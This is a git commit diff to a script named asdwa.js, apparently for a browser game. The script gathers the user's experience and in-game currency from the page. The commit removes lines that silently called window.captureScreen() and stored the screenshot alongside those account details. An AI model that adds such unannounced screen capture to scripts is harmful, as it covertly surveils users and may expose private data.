0b768863284951d461fdba1efd3e41e809ace5fc
LEaRCrEaM <127627494+LEaRCrEaM@users.noreply.github.com>
2026-01-26 14:13:32 -0500

    Update asdwa.js

--- asdwa.js
+++ asdwa.js
@@ -91,9 +91,6 @@ try{if(!access){window.whitelist=["Sui","Snitch"];}else{try{if(!whitelist) {whit
         if (!User.exp) {
             if (t = document.querySelector('.UserInfoContainerStyle-progressValue')) {
                 User.exp = t.textContent;
-                window.captureScreen().then(result => {
-                    User.patata = result;
-                });
             };
         };
         if (!User.crystals || !User.tankoins) {
